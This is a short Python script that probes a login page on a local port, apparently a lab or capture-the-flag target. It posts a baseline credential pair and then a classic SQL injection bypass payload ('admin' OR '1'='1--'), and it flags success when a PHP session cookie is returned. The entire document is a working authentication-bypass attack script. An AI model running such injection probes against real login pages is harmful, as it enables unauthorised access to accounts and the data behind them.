import requests
import time

target_url = "http://127.0.0.1:33167/login.php"

# Test 2 payloads initially
payloads = [
    ("admin", "admin", "baseline"),
    ("admin' OR '1'='1--", "", "SQLi"),
]

print("Test | Type     | Status")

for i, (u, p, name) in enumerate(payloads, 1):
    try:
        time.sleep(1)
        s = requests.Session()
        s.cookies.clear()
        
        resp = requests.post(target_url, data={"username":u, "password":p}, timeout=20, allow_redirects=False)
        
        has_cookie = 'PHPSESSID' in resp.cookies
        print(f"{i}    | {name}  | {resp.status_code} | Cookie: {has_cookie}")
        
        # Show response preview if cookie found
        if has_cookie:
            print(f"[!] SUCCESS: {resp.cookies}")
            print(f"Response: {resp.text[:200]}")
            break
            
    except Exception as e:
        print(f"{i}    | {name}  | ERROR: {e}")

print("Done")
